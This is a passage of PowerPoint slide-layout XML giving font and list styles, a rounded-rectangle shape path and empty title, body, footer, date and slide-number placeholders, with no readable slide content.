                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="715963" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="715963" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1235">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="bk object 20"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="481061" y="2350434"/>
            <a:ext cx="2593879" cy="240926"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 2767329"/>
              <a:gd name="T1" fmla="*/ 890 h 342264"/>
              <a:gd name="T2" fmla="*/ 0 w 2767329"/>
              <a:gd name="T3" fmla="*/ 314 h 342264"/>
              <a:gd name="T4" fmla="*/ 12 w 2767329"/>
              <a:gd name="T5" fmla="*/ 192 h 342264"/>
              <a:gd name="T6" fmla="*/ 42 w 2767329"/>
              <a:gd name="T7" fmla="*/ 92 h 342264"/>
              <a:gd name="T8" fmla="*/ 88 w 2767329"/>
              <a:gd name="T9" fmla="*/ 25 h 342264"/>
              <a:gd name="T10" fmla="*/ 144 w 2767329"/>
              <a:gd name="T11" fmla="*/ 0 h 342264"/>
              <a:gd name="T12" fmla="*/ 4329 w 2767329"/>
              <a:gd name="T13" fmla="*/ 0 h 342264"/>
              <a:gd name="T14" fmla="*/ 4385 w 2767329"/>
              <a:gd name="T15" fmla="*/ 25 h 342264"/>
              <a:gd name="T16" fmla="*/ 4430 w 2767329"/>
              <a:gd name="T17" fmla="*/ 92 h 342264"/>
              <a:gd name="T18" fmla="*/ 4462 w 2767329"/>
              <a:gd name="T19" fmla="*/ 192 h 342264"/>
              <a:gd name="T20" fmla="*/ 4473 w 2767329"/>
              <a:gd name="T21" fmla="*/ 314 h 342264"/>
              <a:gd name="T22" fmla="*/ 4473 w 2767329"/>
              <a:gd name="T23" fmla="*/ 890 h 342264"/>
              <a:gd name="T24" fmla="*/ 4462 w 2767329"/>
              <a:gd name="T25" fmla="*/ 1012 h 342264"/>
              <a:gd name="T26" fmla="*/ 4430 w 2767329"/>
              <a:gd name="T27" fmla="*/ 1113 h 342264"/>
              <a:gd name="T28" fmla="*/ 4385 w 2767329"/>
              <a:gd name="T29" fmla="*/ 1180 h 342264"/>
              <a:gd name="T30" fmla="*/ 4329 w 2767329"/>
              <a:gd name="T31" fmla="*/ 1205 h 342264"/>
              <a:gd name="T32" fmla="*/ 144 w 2767329"/>
              <a:gd name="T33" fmla="*/ 1205 h 342264"/>
              <a:gd name="T34" fmla="*/ 88 w 2767329"/>
              <a:gd name="T35" fmla="*/ 1180 h 342264"/>
              <a:gd name="T36" fmla="*/ 42 w 2767329"/>
              <a:gd name="T37" fmla="*/ 1113 h 342264"/>
              <a:gd name="T38" fmla="*/ 12 w 2767329"/>
              <a:gd name="T39" fmla="*/ 1012 h 342264"/>
              <a:gd name="T40" fmla="*/ 0 w 2767329"/>
              <a:gd name="T41" fmla="*/ 890 h 34226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767329" h="342264">
                <a:moveTo>
                  <a:pt x="0" y="252710"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="89156"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7006" y="54452"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26113" y="26113"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="54452" y="7006"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89156" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2677731" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2712434" y="7006"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2740772" y="26113"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2759879" y="54452"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2766885" y="89156"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2766885" y="252710"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2759879" y="287414"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2740772" y="315753"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2712434" y="334861"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2677731" y="341867"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89156" y="341867"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="54452" y="334861"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26113" y="315753"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7006" y="287414"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="252710"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="25399">
            <a:solidFill>
              <a:srgbClr val="C82506"/>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Holder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4500563" y="44649"/>
            <a:ext cx="3190875" cy="389530"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2471" b="0" i="0" u="heavy">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="3840480"/>
            <a:ext cx="8534400" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4144818" y="6377549"/>
            <a:ext cx="3902364" cy="249331"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr" defTabSz="806157" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="1588">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609986" y="6377549"/>
            <a:ext cx="2803621" cy="249331"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" defTabSz="806157" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="1588">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{CD4B92EC-7293-42E8-93AF-56AB978FCA73}" type="datetimeFigureOut">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8778394" y="6377549"/>
            <a:ext cx="2803622" cy="249331"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr defTabSz="805466" eaLnBrk="0" hangingPunct="0">
              <a:defRPr sz="1588"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{7FD07C5C-1371-46A7-9EAE-61310AE332EA}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="402297704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940594" y="357188"/>
            <a:ext cx="10310812" cy="865622"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="5559" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="903090" y="1193008"/>
            <a:ext cx="10385822" cy="389530"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2471" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4144818" y="6377549"/>
            <a:ext cx="3902364" cy="249331"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr" defTabSz="806157" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="1588">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609986" y="6377549"/>
            <a:ext cx="2803621" cy="249331"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" defTabSz="806157" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="1588">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{4876A10B-E8E1-42EE-BCB0-B7F5B53084CD}" type="datetimeFigureOut">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8778394" y="6377549"/>
            <a:ext cx="2803622" cy="249331"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr defTabSz="805466" eaLnBrk="0" hangingPunct="0">
              <a:defRPr sz="1588"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{63DF8652-97F9-40F3-B228-93EFE2ED71DE}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="418629907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940594" y="357188"/>
            <a:ext cx="10310812" cy="865622"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="5559" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1577340"/>
            <a:ext cx="5303520" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6278880" y="1577340"/>
            <a:ext cx="5303520" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4144818" y="6377549"/>
            <a:ext cx="3902364" cy="249331"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr" defTabSz="806157" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="1588">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609986" y="6377549"/>
            <a:ext cx="2803621" cy="249331"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" defTabSz="806157" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="1588">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{B04C62CF-7584-497D-B5DE-4737E4295F19}" type="datetimeFigureOut">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Holder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8778394" y="6377549"/>
            <a:ext cx="2803622" cy="249331"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr defTabSz="805466" eaLnBrk="0" hangingPunct="0">
              <a:defRPr sz="1588"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{2844855F-4F3D-45A6-8831-8DECA394A3D8}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41576565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a:xfrm>
            <a:off x="940594" y="357188"/>
            <a:ext cx="10310812" cy="865622"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="5559" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4144818" y="6377549"/>
            <a:ext cx="3902364" cy="249331"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr" defTabSz="806157" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="1588">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609986" y="6377549"/>
            <a:ext cx="2803621" cy="249331"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" defTabSz="806157" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="1588">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{2115AFDF-2C14-4454-BD79-31EEC8782DEE}" type="datetimeFigureOut">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8778394" y="6377549"/>
            <a:ext cx="2803622" cy="249331"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr defTabSz="805466" eaLnBrk="0" hangingPunct="0">
              <a:defRPr sz="1588"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{2F622110-7B4F-4638-BAAB-9450E3830A33}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="422686463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10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4144818" y="6377549"/>
            <a:ext cx="3902364" cy="249331"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr" defTabSz="806157" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="1588">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609986" y="6377549"/>
            <a:ext cx="2803621" cy="249331"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
